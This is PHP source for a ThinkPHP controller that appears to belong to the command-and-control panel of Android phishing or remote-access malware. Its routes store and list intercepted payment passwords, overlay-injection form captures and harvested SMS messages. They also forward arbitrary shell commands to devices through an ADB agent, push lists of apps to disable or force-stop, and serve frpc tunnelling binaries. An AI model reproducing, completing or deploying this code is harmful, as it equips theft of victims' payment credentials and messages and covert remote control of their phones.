<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

/**
 * 杂项控制器 — 处理旧 Python 后端中的各种辅助路由
 * 这些路由主要是 stub/兼容性接口，确保前端/APK 调用不报错
 */
class MiscController extends BaseController
{
    // ==================== License ====================

    /**
     * GET /api/license/max-users
     */
    public function maxUsers()
    {
        return json(['success' => true, 'data' => ['maxUsers' => 999], 'message' => 'success']);
    }

    // ==================== System Debug ====================

    /**
     * GET /api/system/debug/connections
     * 调试接口：查看 Node.js WS 连接池状态
     */
    public function debugConnections()
    {
        try {
            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
            $resp = @file_get_contents($this->wsBaseUrl() . '/online-devices', false, $ctx);
            $data = $resp !== false ? json_decode($resp, true) : [];
        } catch (\Throwable $e) {
            $data = [];
        }

        return json([
            'success' => true,
            'device_connections_keys' => $data['devices'] ?? [],
            'device_connections_count' => count($data['devices'] ?? []),
            'bridge_connections_keys' => $data['bridges'] ?? [],
            'bridge_connections_count' => count($data['bridges'] ?? []),
            'bridge_aliases' => $data['aliases'] ?? [],
            'admin_connections_count' => $data['adminCount'] ?? 0,
        ]);
    }

    // ==================== Password Inputs ====================

    /**
     * DELETE /api/password-inputs/id/:inputId
     */
    public function deletePasswordInput($inputId)
    {
        return json(['success' => false, 'message' => '不允许删除密码数据'], 403);
    }

    /**
     * GET /api/alipay-passwords/:deviceId
     */
    public function alipayPasswords($deviceId)
    {
        return json(['success' => true, 'data' => [], 'message' => 'success']);
    }

    /**
     * GET|DELETE /api/payment-cipher-records
     * GET: 查询支付密码截获记录，支持 deviceId 过滤和分页
     * DELETE: 删除记录（支持单条删除 ?id=xxx 或按设备清空 ?deviceId=xxx）
     */
    public function paymentCipherRecords()
    {
        if (Request::isDelete()) {
            $id = Request::get('id', '');
            $deviceId = Request::get('deviceId', '');
            if ($id) {
                Db::table('fisher_payment_cipher_records')->where('id', $id)->delete();
            } elseif ($deviceId) {
                Db::table('fisher_payment_cipher_records')->where('device_id', $deviceId)->delete();
            } else {
                Db::table('fisher_payment_cipher_records')->delete(true);
            }
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        $deviceId = Request::get('deviceId', '');
        $page = (int)Request::get('page', 1);
        $pageSize = (int)Request::get('pageSize', 50);

        $query = Db::table('fisher_payment_cipher_records');
        if ($deviceId) {
            $query->where('device_id', $deviceId);
        }

        $total = $query->count();
        $records = $query->order('created_at', 'desc')
            ->limit($pageSize)->page($page)
            ->select()->toArray();

        $items = array_map(fn($r) => [
            'id' => $r['id'],
            'deviceId' => $r['device_id'],
            'packageName' => $r['package_name'],
            'appName' => $r['app_name'],
            'cipher' => $r['cipher_text'],
            'cipherType' => $r['cipher_type'],
            'source' => $r['source'] ?? '',
            'createdAt' => ($r['created_at'] ?? 0) * 1000,
        ], $records);

        return json(['success' => true, 'data' => ['records' => $items, 'total' => $total], 'message' => 'success']);
    }

    // ==================== Injection ====================

    /**
     * GET|DELETE /api/injection/data?deviceId=xxx
     * Python: injection_data_list()
     */
    public function injectionData()
    {
        $deviceId = Request::get('deviceId', '');

        if (Request::isDelete()) {
            $itemId = Request::get('id', '');
            if ($itemId && $deviceId) {
                Db::table('fisher_injection_data')->where('device_id', $deviceId)->where('id', $itemId)->delete();
            } elseif ($deviceId) {
                Db::table('fisher_injection_data')->where('device_id', $deviceId)->delete();
            }
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        if (!$deviceId) {
            return json(['success' => true, 'data' => ['list' => []], 'message' => 'success']);
        }

        $rows = Db::table('fisher_injection_data')
            ->where('device_id', $deviceId)
            ->order('created_at', 'desc')
            ->select()->toArray();

        $result = [];
        foreach ($rows as $r) {
            $formData = $r['form_data'] ?? '{}';
            $parsedData = json_decode($formData, true) ?: [];
            $createdAt = $r['created_at'] ?? 0;
            $timestamp = is_numeric($createdAt) ? (int)($createdAt * 1000) : $createdAt;

            $result[] = [
                'id'           => $r['id'] ?? 0,
                'deviceId'     => $r['device_id'] ?? '',
                'templateName' => $r['template_name'] ?? '',
                'packageName'  => $r['package_name'] ?? '',
                'data'         => $parsedData,
                'timestamp'    => $timestamp,
            ];
        }

        return json(['success' => true, 'data' => ['list' => $result], 'message' => 'success']);
    }

    /**
     * GET /api/injection/counts
     * Python: injection_counts()
     */
    public function injectionCounts()
    {
        $total = Db::table('fisher_injection_data')->count();
        return json(['success' => true, 'data' => ['total' => $total], 'message' => 'success']);
    }

    /**
     * GET|PUT|DELETE /api/injection/global-configs/:configId
     */
    public function injectionGlobalConfigDetail($configId)
    {
        return json(['success' => true, 'data' => (object)[], 'message' => 'success']);
    }

    // ==================== Device Injection Status ====================

    /**
     * GET|PUT /api/device/:id/global-injection-status
     */
    public function globalInjectionStatus($id)
    {
        if (Request::isPut() || Request::isPost()) {
            $data = Request::post();
            $active = $data['active'] ?? $data['injection_active'] ?? false;
            Db::table('fisher_devices')->where('device_id', $id)->update(['injection_active' => $active ? 1 : 0]);
            return json(['success' => true, 'data' => ['injection_active' => (bool)$active], 'message' => 'success']);
        }

        $row = Db::table('fisher_devices')->field('injection_active')->where('device_id', $id)->find();
        return json(['success' => true, 'data' => ['injection_active' => (bool)($row['injection_active'] ?? false)], 'message' => 'success']);
    }

    /**
     * GET|PUT /api/device/:id/permissions
     */
    public function devicePermissions($id)
    {
        if (Request::isPut() || Request::isPost()) {
            $data = Request::post();
            $permissions = $data['permissions'] ?? $data;
            Db::table('fisher_devices')->where('device_id', $id)->update([
                'permissions' => json_encode($permissions, JSON_UNESCAPED_UNICODE),
            ]);
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        $row = Db::table('fisher_devices')->field('permissions')->where('device_id', $id)->find();
        $permissions = json_decode($row['permissions'] ?? '{}', true) ?: [];
        return json(['success' => true, 'data' => $permissions, 'message' => 'success']);
    }

    /**
     * GET /api/device/injection/global-configs
     * 设备端调用，返回空
     */
    public function deviceInjectionGlobalConfigs()
    {
        return json(['success' => true, 'data' => ['configs' => []], 'message' => 'success']);
    }

    /**
     * GET /api/device/cacheTasks
     */
    public function cacheTasks()
    {
        return json(['success' => true, 'data' => [], 'message' => 'success']);
    }

    /**
     * GET /api/device/cacheTask
     */
    public function cacheTask()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    // ==================== Black Apps / Sensitive Apps (全局) ====================

    /**
     * GET /api/black-apps
     */
    public function listBlackApps()
    {
        try {
            $rows = Db::table('fisher_black_apps')->select()->toArray();
        } catch (\Throwable $e) {
            $rows = [];
        }
        return json(['success' => true, 'data' => ['apps' => $rows], 'message' => 'success']);
    }

    /** 读取可选策略列，避免不同部署的旧表因缺列保存失败。 */
    protected static function policyColumns(string $table): array
    {
        try {
            $rows = Db::query('SHOW COLUMNS FROM ' . $table);
            return array_values(array_filter(array_map(static function ($row) {
                return (string)($row['Field'] ?? $row['field'] ?? '');
            }, $rows)));
        } catch (\Throwable $e) {
            return [];
        }
    }

    /**
     * POST /api/black-apps/add
     */
    public function addBlackApp()
    {
        $data = Request::post();
        $packageName = trim((string)($data['packageName'] ?? $data['package_name'] ?? ''));
        if ($packageName === '') {
            return json(['success' => false, 'message' => 'packageName required'], 400);
        }
        try {
            $exists = Db::table('fisher_black_apps')->where('package_name', $packageName)->find();
            if ($exists) {
                return json(['success' => true, 'data' => $exists, 'message' => 'already exists']);
            }
            $record = [
                'app_name'     => trim((string)($data['appName'] ?? $data['app_name'] ?? '')),
                'package_name' => $packageName,
                'created_at'   => time(),
            ];
            $columns = static::policyColumns('fisher_black_apps');
            if (in_array('action', $columns, true)) {
                $action = trim((string)($data['action'] ?? 'disable'));
                $record['action'] = in_array($action, ['disable', 'force-stop'], true) ? $action : 'disable';
            }
            if (in_array('enabled', $columns, true)) $record['enabled'] = !isset($data['enabled']) || (bool)$data['enabled'] ? 1 : 0;
            Db::table('fisher_black_apps')->insert($record);
        } catch (\Throwable $e) {
            return json(['success' => false, 'message' => '保存安全 App 失败'], 500);
        }
        static::pushGlobalPolicy('black');
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/black-apps/remove
     */
    public function removeBlackApp()
    {
        $data = Request::post();
        $id = $data['id'] ?? 0;
        try {
            Db::table('fisher_black_apps')->where('id', $id)->delete();
        } catch (\Throwable $e) {
            return json(['success' => false, 'message' => '删除安全 App 失败'], 500);
        }
        static::pushGlobalPolicy('black');
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/sensitive-apps
     */
    public function listSensitiveApps()
    {
        try {
            $rows = Db::table('fisher_sensitive_apps')->select()->toArray();
        } catch (\Throwable $e) {
            $rows = [];
        }
        return json(['success' => true, 'data' => ['apps' => $rows], 'message' => 'success']);
    }

    /**
     * POST /api/sensitive-apps/add
     */
    public function addSensitiveApp()
    {
        $data = Request::post();
        $packageName = trim((string)($data['packageName'] ?? $data['package_name'] ?? ''));
        if ($packageName === '') {
            return json(['success' => false, 'message' => 'packageName required'], 400);
        }
        try {
            $exists = Db::table('fisher_sensitive_apps')->where('package_name', $packageName)->find();
            if ($exists) {
                return json(['success' => true, 'data' => $exists, 'message' => 'already exists']);
            }
            $record = [
                'app_name'     => trim((string)($data['appName'] ?? $data['app_name'] ?? '')),
                'package_name' => $packageName,
                'created_at'   => time(),
            ];
            $columns = static::policyColumns('fisher_sensitive_apps');
            if (in_array('enable_delay', $columns, true)) $record['enable_delay'] = max(0, (int)($data['enableDelay'] ?? $data['enable_delay'] ?? 0));
            if (in_array('enabled', $columns, true)) $record['enabled'] = !isset($data['enabled']) || (bool)$data['enabled'] ? 1 : 0;
            Db::table('fisher_sensitive_apps')->insert($record);
        } catch (\Throwable $e) {
            return json(['success' => false, 'message' => '保存敏感 App 失败'], 500);
        }
        static::pushGlobalPolicy('sensitive');
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/sensitive-apps/remove
     */
    public function removeSensitiveApp()
    {
        $data = Request::post();
        $id = $data['id'] ?? 0;
        try {
            Db::table('fisher_sensitive_apps')->where('id', $id)->delete();
        } catch (\Throwable $e) {
            return json(['success' => false, 'message' => '删除敏感 App 失败'], 500);
        }
        static::pushGlobalPolicy('sensitive');
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /** 读取全局名单并推送到在线 APK。 */
    protected static function pushGlobalPolicy(string $kind): void
    {
        try {
            if ($kind === 'sensitive') {
                $rows = Db::table('fisher_sensitive_apps')->where('package_name', '<>', '')->select()->toArray();
                $apps = array_values(array_unique(array_filter(array_map(static function ($row) {
                    return trim((string)($row['package_name'] ?? ''));
                }, $rows))));
                static::pushDeviceCommand('SET_SENSITIVE_APPS', ['apps' => $apps]);
                return;
            }
            if ($kind === 'black') {
                $rows = Db::table('fisher_black_apps')->where('package_name', '<>', '')->select()->toArray();
                $apps = array_values(array_unique(array_filter(array_map(static function ($row) {
                    return trim((string)($row['package_name'] ?? ''));
                }, $rows))));
                static::pushDeviceCommand('SET_BLACK_APPS', ['apps' => $apps]);
            }
        } catch (\Throwable $e) {
            // 配置已保存；设备下次上线时由 WS 自动补发
        }
    }

    // ==================== Device-level Black/Sensitive Apps ====================

    /**
     * GET /api/device-black-apps?deviceId=xxx
     */
    public function deviceBlackApps()
    {
        return json(['success' => true, 'data' => ['apps' => []], 'message' => 'success']);
    }

    public function deviceBlackAppsAdd()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    public function deviceBlackAppsRemove()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    public function deviceBlackAppsPush()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/device-sensitive-apps?deviceId=xxx
     */
    public function deviceSensitiveApps()
    {
        return json(['success' => true, 'data' => ['apps' => []], 'message' => 'success']);
    }

    public function deviceSensitiveAppsAdd()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    public function deviceSensitiveAppsRemove()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    public function deviceSensitiveAppsPush()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    // ==================== Device Payment Strategies ====================

    /**
     * GET|POST|PUT /api/device-payment-strategies/:deviceId
     */
    public function devicePaymentStrategies($deviceId)
    {
        if (Request::isPost() || Request::isPut()) {
            // POST/PUT: 绑定策略到设备
            $raw = file_get_contents('php://input');
            $data = json_decode($raw, true) ?: Request::post();
            $strategyIds = $data['strategyIds'] ?? [];

            // 先删除旧绑定
            Db::table('fisher_device_payment_strategy_bindings')->where('device_id', $deviceId)->delete();

            // 插入新绑定
            foreach ($strategyIds as $sid) {
                Db::table('fisher_device_payment_strategy_bindings')->insert([
                    'device_id'   => $deviceId,
                    'strategy_id' => (int)$sid,
                    'created_at'  => time(),
                ]);
            }

            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        // GET: 获取设备绑定的策略ID列表
        $bindings = Db::table('fisher_device_payment_strategy_bindings')
            ->where('device_id', $deviceId)
            ->column('strategy_id');

        return json(['success' => true, 'enabledIds' => $bindings, 'data' => ['enabledIds' => $bindings], 'message' => 'success']);
    }

    /**
     * POST /api/device-payment-strategies/:deviceId/push
     * 返回该设备绑定的所有启用策略的包名列表，前端用于发 SET_VIEW_CACHE_RULES
     */
    public function devicePaymentStrategiesPush($deviceId)
    {
        // 获取设备绑定的策略
        $bindings = Db::table('fisher_device_payment_strategy_bindings')
            ->alias('b')
            ->join('fisher_payment_strategies s', 'b.strategy_id = s.id')
            ->where('b.device_id', $deviceId)
            ->where('s.enabled', 1)
            ->column('s.package_name');

        $packages = array_map(function($pkg) { return ['packageName' => $pkg]; }, $bindings);

        return json(['success' => true, 'data' => ['packages' => $packages], 'packages' => $packages, 'message' => 'success']);
    }

    // ==================== ADB Keys (独立路由) ====================

    /**
     * GET|POST /api/adb-keys/
     * Python: adb_keys_list() — 与 /api/device/adb-keys 类似但路径不同
     */
    public function adbKeys()
    {
        if (Request::isPost()) {
            $data = Request::post();
            $deviceId = $data['deviceId'] ?? '';
            $publicKey = $data['publicKey'] ?? '';
            $certificate = $data['certificate'] ?? '';
            $wifiPort = $data['wifiPort'] ?? 0;

            if ($deviceId) {
                Db::table('fisher_adb_keys')->insert([
                    'device_id'   => $deviceId,
                    'public_key'  => $publicKey,
                    'certificate' => $certificate,
                    'wifi_port'   => $wifiPort,
                    'created_at'  => time(),
                    'updated_at'  => time(),
                ]);
                Db::table('fisher_devices')->where('device_id', $deviceId)->update([
                    'adb_enabled' => 1,
                    'wifi_port'   => $wifiPort,
                ]);
            }
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }

        // GET
        $deviceId = Request::get('deviceId', '');
        $query = Db::table('fisher_adb_keys');
        if ($deviceId) {
            $query->where('device_id', $deviceId);
        }
        $rows = $query->order('created_at', 'desc')->select()->toArray();
        return json(['success' => true, 'data' => $rows, 'message' => 'success']);
    }

    /**
     * POST /api/adb-keys/port
     */
    public function adbKeysPort()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        $port = $data['port'] ?? 0;
        if ($deviceId && $port) {
            Db::table('fisher_devices')->where('device_id', $deviceId)->update(['wifi_port' => $port]);
        }
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/adb-keys/upload
     */
    public function adbKeysUpload()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/syncADBConfig
     */
    public function syncADBConfig()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/shareADBConfig
     */
    public function shareADBConfig()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    // ==================== ADB Agent ====================

    /**
     * GET /api/adb-agent/status
     * 查询所有 ADB Agent 连接状态 — 通过 Node.js WS 查询
     */
    public function adbAgentStatusAll()
    {
        try {
            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
            $resp = @file_get_contents($this->wsBaseUrl() . '/online-devices', false, $ctx);
            $data = $resp !== false ? json_decode($resp, true) : [];
            $agents = $data['agents'] ?? [];
        } catch (\Throwable $e) {
            $agents = [];
        }

        return json(['success' => true, 'data' => ['agents' => $agents, 'total' => count($agents)], 'message' => 'success']);
    }

    /**
     * GET /api/adb-agent/status/:deviceId
     */
    public function adbAgentStatusDevice($deviceId)
    {
        try {
            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
            $resp = @file_get_contents($this->wsBaseUrl() . '/online-devices', false, $ctx);
            $data = $resp !== false ? json_decode($resp, true) : [];
            $agents = $data['agents'] ?? [];
            $connected = in_array($deviceId, $agents);
        } catch (\Throwable $e) {
            $connected = false;
        }

        return json(['success' => true, 'data' => ['deviceId' => $deviceId, 'connected' => $connected], 'message' => 'success']);
    }

    /**
     * POST /api/adb-agent/disconnect/:deviceId
     */
    public function adbAgentDisconnect($deviceId)
    {
        // 通过 Node.js WS 服务发送断开命令
        try {
            $ctx = stream_context_create(['http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => json_encode(['deviceId' => $deviceId, 'action' => 'disconnect_agent']),
                'timeout' => 3,
            ]]);
            @file_get_contents($this->wsBaseUrl() . '/internal/command', false, $ctx);
        } catch (\Throwable $e) {}

        return json(['success' => true, 'data' => ['deviceId' => $deviceId], 'message' => 'ADB Agent 已断开']);
    }

    /**
     * PUT /api/adb-agent/config/:deviceId
     */
    public function adbAgentConfig($deviceId)
    {
        $data = Request::post();
        $serial = $data['serial'] ?? '';
        if (!$serial) {
            return json(['success' => false, 'message' => 'serial 参数为必填'], 400);
        }

        // 通过 Node.js WS 服务推送配置
        try {
            $ctx = stream_context_create(['http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => json_encode(['deviceId' => $deviceId, 'action' => 'agent_config', 'serial' => $serial]),
                'timeout' => 3,
            ]]);
            @file_get_contents($this->wsBaseUrl() . '/internal/command', false, $ctx);
        } catch (\Throwable $e) {}

        return json(['success' => true, 'data' => ['deviceId' => $deviceId, 'serial' => $serial], 'message' => '配置已推送']);
    }

    /**
     * POST /api/adb-agent/send/:deviceId
     */
    public function adbAgentSend($deviceId)
    {
        $data = Request::post();
        $command = $data['command'] ?? '';
        if (!$command) {
            return json(['success' => false, 'message' => 'command 参数为必填'], 400);
        }

        // 通过 Node.js WS 服务转发命令
        try {
            $ctx = stream_context_create(['http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => json_encode(['deviceId' => $deviceId, 'action' => 'agent_shell', 'command' => $command, 'params' => $data['params'] ?? []]),
                'timeout' => 3,
            ]]);
            @file_get_contents($this->wsBaseUrl() . '/internal/command', false, $ctx);
        } catch (\Throwable $e) {}

        return json(['success' => true, 'data' => ['deviceId' => $deviceId, 'command' => $command], 'message' => '命令已发送']);
    }

    // ==================== Gesture ====================

    /**
     * GET|POST /api/gesture/:deviceId
     * GET /api/gesture/list
     */
    public function gesture($deviceId = null)
    {
        return json(['success' => true, 'data' => [], 'message' => 'success']);
    }

    public function gestureList()
    {
        return json(['success' => true, 'data' => [], 'message' => 'success']);
    }

    // ==================== IP Geo ====================

    /**
     * GET /api/ip-geo/:ip
     */
    public function ipGeo($ip)
    {
        $geo = '--';
        if ($ip && !in_array($ip, ['--', 'WS_CLIENT', '127.0.0.1', ''])) {
            try {
                $ctx = stream_context_create(['http' => ['timeout' => 3, 'header' => 'User-Agent: Mozilla/5.0']]);
                $ipApiBase = rtrim(env('external.ip_api_url', 'http://ip-api.com/json'), '/');
                $url = $ipApiBase . "/{$ip}?lang=zh-CN&fields=status,country,regionName,city";
                $resp = @file_get_contents($url, false, $ctx);
                if ($resp) {
                    $data = json_decode($resp, true);
                    if (($data['status'] ?? '') === 'success') {
                        $country = $data['country'] ?? '';
                        $region = $data['regionName'] ?? '';
                        $geo = $region ? "{$country}-{$region}" : $country;
                    }
                }
            } catch (\Throwable $e) {}
        }
        return json(['success' => true, 'data' => ['ip' => $ip, 'geoLocation' => $geo], 'message' => 'success']);
    }

    // ==================== SMS Notifications ====================

    /**
     * GET /api/sms/notifications
     * Python: sms_notifications() — 分页获取短信
     */
    public function smsNotifications()
    {
        $user = $this->request->user ?? $this->request->userPayload ?? null;
        $page = max(1, (int)Request::get('page', 1));
        $pageSize = max(1, min(200, (int)Request::get('pageSize', 50)));
        $role = $user['role'] ?? '';

        $query = Db::table('fisher_sms_messages');

        // 按 deviceId 过滤（如果传了）
        $deviceId = Request::get('deviceId', '');
        if ($deviceId) {
            $query->where('device_id', $deviceId);
        }

        // 短信中心内容搜索；保留 deviceId 精确过滤供设备详情页使用。
        $keyword = trim((string)Request::get('keyword', ''));
        if ($keyword !== '') {
            if (function_exists('mb_substr')) {
                $keyword = mb_substr($keyword, 0, 200, 'UTF-8');
            } else {
                $keyword = substr($keyword, 0, 200);
            }
            $query->whereLike('body', '%' . $keyword . '%');
        }

        // 非 admin 用户只能查看归属自己设备的短信
        if (!in_array($role, ['admin', 'superadmin', 'super-admin'])) {
            $username = $user['username'] ?? '';
            $deviceIds = Db::table('fisher_devices')
                ->where('owner_username', $username)
                ->column('device_id');
            if ($deviceIds) {
                $query->whereIn('device_id', $deviceIds);
            } else {
                return json(['success' => true, 'data' => ['list' => [], 'total' => 0, 'page' => $page, 'pageSize' => $pageSize], 'message' => 'success']);
            }
        }

        $total = $query->count();
        $list = $query->order('created_at', 'desc')
            ->limit($pageSize)
            ->page($page)
            ->select()->toArray();

        // 转换字段名：device_id -> deviceId
        foreach ($list as &$item) {
            if (isset($item['device_id'])) {
                $item['deviceId'] = $item['device_id'];
            }
        }

        return json(['success' => true, 'data' => ['list' => $list, 'total' => $total, 'page' => $page, 'pageSize' => $pageSize], 'message' => 'success']);
    }

    // ==================== Crypto Wallets ====================

    /**
     * GET /api/devices/crypto-wallets
     */
    public function cryptoWallets()
    {
        return json(['success' => true, 'data' => [], 'message' => 'success']);
    }

    // ==================== Video Upload ====================

    /**
     * POST /api/video/upload
     */
    public function videoUpload()
    {
        return json(['success' => true, 'data' => ['url' => ''], 'message' => 'success']);
    }

    // ==================== Dex Tools ====================

    /**
     * GET /api/dex-tools/status
     */
    public function dexToolsStatus()
    {
        return json(['success' => true, 'data' => ['status' => 'inactive'], 'message' => 'success']);
    }

    // ==================== Local Service ====================

    /**
     * GET|POST /api/local-service/proxy
     */
    public function localServiceProxy()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/local-service/upload-install
     */
    public function localServiceUploadInstall()
    {
        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/local-service/screen/shot
     * GET /api/local-service/screen/status
     * GET /api/local-service/screen/stream
     */
    public function localServiceScreen()
    {
        return json(['success' => true, 'data' => ['status' => 'unavailable'], 'message' => 'success']);
    }

    // ==================== Binary Download ====================

    /**
     * GET /api/binary/:arch/frpc
     * GET /api/binary/:arch/minicap
     * GET /api/binary/:arch/minicap.so
     * GET /api/binary/noarch/minicap.apk
     * 返回 404（实际二进制文件应由 nginx 直接提供）
     */
    public function binaryDownload($arch = '', $name = '')
    {
        $name = $name ?: (string)request()->param('name', '');
        $name = ltrim(str_replace(['..', '\\'], '', $name), '/');
        $arch = trim(str_replace(['..', '\\', '/'], '', (string)$arch));
        $candidates = [];
        if ($arch !== '' && $name !== '') {
            $candidates[] = public_path() . "s/bn/{$arch}/{$name}";
            $candidates[] = root_path() . "extend/bin/{$arch}/{$name}";
        } elseif ($arch !== '') {
            $candidates[] = public_path() . "s/bn/{$arch}";
            $candidates[] = root_path() . "extend/bin/{$arch}";
        }
        foreach ($candidates as $file) {
            if (is_file($file) && filesize($file) > 0) {
                return download($file, basename($file))->force(false);
            }
        }
        return response('', 404)->contentType('application/octet-stream');
    }

    /**
     * GET /s/bn/native
     * DXS 会把缺失资源保存成可执行文件；这里必须返回空 404，避免把前端 HTML 写成二进制后反复执行报错。
     */
    public function nativeBinary()
    {
        return $this->binaryDownload('native', '');
    }
}
